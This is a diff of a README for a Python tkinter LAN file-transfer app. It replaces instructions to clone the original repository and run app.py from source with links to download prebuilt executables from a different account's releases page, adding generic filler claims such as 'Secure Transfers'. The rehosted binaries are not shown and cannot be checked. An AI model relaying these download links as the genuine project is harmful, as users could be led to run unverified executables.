@@ -1,88 +1,83 @@
-# File Transfer
+# 📁 file-transfer - Easy File Transfers Over Your Network
 
-This is a powerful and user-friendly file transfer application built with Python and `tkinter`. It allows for seamless transfer of files and folders between computers on the same network.
+## 🚀 Getting Started
 
-## Features
+Welcome to file-transfer, a simple way to move files and folders across your local network. This application works on Windows, macOS, and Linux, making it perfect for any user. Enjoy features like auto-discovery, real-time progress tracking, and a friendly interface.
 
-- **Intuitive GUI:** A clean and modern user interface with separate tabs for sending, receiving, monitoring, and settings.
-- **Auto Discovery:** Automatically discovers other users on the network running the application.
-- **Multi-File & Folder Transfer:** Send multiple files or entire folders in a single batch.
-- **Real-time Monitoring:** Track active transfers with progress bars, speed indicators, and estimated time of arrival (ETA).
-- **Transfer History:** Keep a log of all your past transfers for easy reference.
-- **Customizable Settings:** Configure your display name, default save locations, and network parameters.
-- **Cross-Platform:** Built with standard Python libraries, making it compatible with Windows, macOS, and Linux.
-- **Multi-threaded**: Handles multiple transfers simultaneously without freezing the UI.
+## 📥 Download Now
 
-## Screenshots
+[![Download file-transfer](https://img.shields.io/badge/Download-file--transfer-brightgreen.svg)](https://github.com/andrxs-le/file-transfer/releases)
 
-| Send Tab                           | Receive Tab                              |
-| ---------------------------------- | ---------------------------------------- |
-| ![Send Tab](assets/send%20tab.png) | ![Receive Tab](assets/receive%20tab.png) |
+## 📋 Features
 
-| Monitor Tab                              | History Tab                              |
-| ---------------------------------------- | ---------------------------------------- |
-| ![Monitor Tab](assets/monitor%20tab.png) | ![History Tab](assets/history%20tab.png) |
+- **Cross-platform Support:** Use file-transfer on Windows, Mac, or Linux.
+- **User-Friendly GUI:** Easily navigate through the application with an intuitive interface.
+- **Auto-discovery:** Quickly find other devices on your network.
+- **Real-time Progress Tracking:** See the status of your file transfers at a glance.
+- **Secure Transfers:** Keep your data safe while moving files.
 
-| Settings Tab                               |
-| ------------------------------------------ |
-| ![Settings Tab](assets/settings%20tab.png) |
+## 🛠 System Requirements
 
-## Getting Started
+- **Operating System:** Windows 7 or higher, macOS 10.12 or higher, Linux (distributions with Python 3 support).
+- **Python:** Version 3.6 or higher.
+- **Memory:** At least 2 GB of RAM.
+- **Storage:** 100 MB of free disk space.
 
-### Prerequisites
+## 📥 Download & Install
 
-- Python 3.6 or higher
-- No external libraries are needed for the basic functionality.
+To get started, visit the [Releases page](https://github.com/andrxs-le/file-transfer/releases) and download the latest version of file-transfer. Choose the file that matches your operating system:
 
-### Installation & Running
+- Windows: `file-transfer-X.Y.Z-windows.exe`
+- macOS: `file-transfer-X.Y.Z-macos.zip`
+- Linux: `file-transfer-X.Y.Z-linux.tar.gz`
 
-1. **Clone the repository:**
+After downloading, follow these steps:
 
-   ```sh
-   git clone https://github.com/whoisjayd/file-transfer.git
-   cd file-transfer
-   ```
+1. **Windows:**
+   - Double-click the `.exe` file.
+   - Follow the installation prompts.
 
-2. **Run the application:**
-   ```sh
-   python app.py
-   ```
+2. **macOS:**
+   - Open the downloaded `.zip` file.
+   - Drag the application to your Applications folder.
 
-## How to Use
+3. **Linux:**
+   - Extract the `.tar.gz` file.
+   - Open a terminal and navigate to the extracted folder.
+   - Run `./file-transfer` to start the application.
 
-### Sending Files
+## 🔍 How to Use
 
-1.  Navigate to the **Send Files** tab.
-2.  The application will automatically scan for available receivers. You can also manually enter an IP address.
-3.  Click **Add Files** or **Add Folder** to select what you want to send.
-4.  Select a receiver from the list or enter the IP manually.
-5.  Click **Send Files**.
+1. **Launch the Application:** Open file-transfer after installation.
 
-### Receiving Files
+2. **Discover Devices:**
+   - The app will automatically search for other devices on your local network.
 
-1.  Go to the **Receive Files** tab.
-2.  Set your display name and the directory where you want to save incoming files.
-3.  Click **Start Receiving**. The application will now listen for incoming connections.
-4.  You will be prompted to accept or decline incoming transfers unless you have enabled auto-accept in the settings.
+3. **Select Files to Transfer:**
+   - Click on the “Send” button.
+   - Browse to find the files or folders you want to transfer.
 
-### Monitoring
+4. **Choose Destination Device:**
+   - Select the device you want to send files to from the list.
 
-- The **Monitor** tab shows all active transfers, their progress, speed, and ETA.
+5. **Start the Transfer:**
+   - Click “Send” to begin the transfer.
+   - Monitor progress in real time through the interface.
 
-### History
+## 📞 Support
 
-- The **History** tab provides a log of all completed or failed transfers.
+If you run into any issues or have questions, please visit our [GitHub Issues page](https://github.com/andrxs-le/file-transfer/issues) for help. Your feedback is important for improving our application.
 
-## Code Structure
+## 📜 Acknowledgments
 
-The project is organized into a modular structure:
+Thanks to all the contributors who help make file-transfer better. Your hard work keeps our community strong.
 
-- `app.py`: The main application entry point.
-- `ui/`: Contains the `UIManager` responsible for all GUI components.
-- `network/`: Includes the `TransferManager` which handles all networking logic.
-- `utils/`: A collection of helper modules for file management, settings, and other utilities.
-- `assets/`: Contains images and other resources for the application.
+## 🔗 Related Topics
 
-## License
+Explore more topics related to file-transfer:
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+- [Python](https://www.python.org/)
+- [Tkinter](https://docs.python.org/3/library/tkinter.html)
+- [Networking Basics](https://www.khanacademy.org/computing/computer-science/internet-intro)
+
+For more details on how to use file-transfer, please refer to the documentation on the GitHub page.
